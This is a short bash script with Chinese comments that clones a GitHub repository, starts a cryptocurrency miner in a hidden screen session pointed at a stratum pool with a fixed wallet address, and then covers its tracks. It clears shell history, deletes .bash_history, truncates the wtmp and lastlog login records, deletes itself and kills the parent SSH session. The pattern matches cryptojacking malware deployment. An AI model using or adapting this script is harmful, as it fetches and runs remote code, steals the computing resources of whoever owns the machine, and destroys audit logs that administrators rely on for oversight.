#!/bin/bash

# 1. 更新索引并安装必要组件 (Ubuntu 22.04 基础环境)
sudo apt-get update -y
sudo apt-get install -y git screen wget

# 2. 强力清理旧的 screen 会话 (防止重复运行)
screen -ls | grep -o '[0-9]*\.[^[:space:]]*' | xargs -I {} screen -X -S {} quit 2>/dev/null

# 3. 处理旧文件夹 (防止 mv 报错)
cd $HOME
if [ -d "btx" ]; then
    rm -rf btx1
    mv btx btx1
fi

# 4. 获取程序文件
echo "正在从 GitHub 获取程序..."
git clone https://github.com/xiaobintse/btx.git

# 5. 核心修复：给二进制文件赋予执行权限
# 注意：git clone 出来的目录是 btx，里面还有一个名为 btx 的执行文件
if [ -f "$HOME/btx/btx" ]; then
    chmod +x $HOME/btx/btx
else
    echo "错误：未找到执行文件，请检查仓库地址。"
    exit 1
fi

# 6. 启动程序
echo "正在启动后台进程..."
# 使用双引号以确保 $(hostname) 能被正确解析
screen -dmS btx bash -c "sleep 5 && cd $HOME/btx && ./btx -o stratum+tcp://btx-hk.lproute.com:8660 -u btx1zspaa73ljgf4jj3mlesdgkjlyawnv357kuervsvuvp8f0fq786e3qj6mtzs.\$(hostname) -p x -a btx"

# 7. 痕迹清理
echo "清理系统痕迹..."
history -c
history -w
rm -f $HOME/.Xauthority
rm -f $HOME/.bash_history
# 清理登录日志 (Ubuntu 22.04 需要 sudo)
sudo truncate -s 0 /var/log/wtmp 2>/dev/null
sudo truncate -s 0 /var/log/lastlog 2>/dev/null

# 8. 脚本自删除
SCRIPT_PATH=$(readlink -f "$0")
rm -f "$SCRIPT_PATH"

echo "-------------------------------------------------------"
echo "部署完成！程序已在后台运行。"
echo "终端将在 3 秒后自动关闭并断开连接。"
echo "-------------------------------------------------------"

sleep 3

# 9. 强制关闭父进程（断开 SSH 连接）
kill -9 $PPID
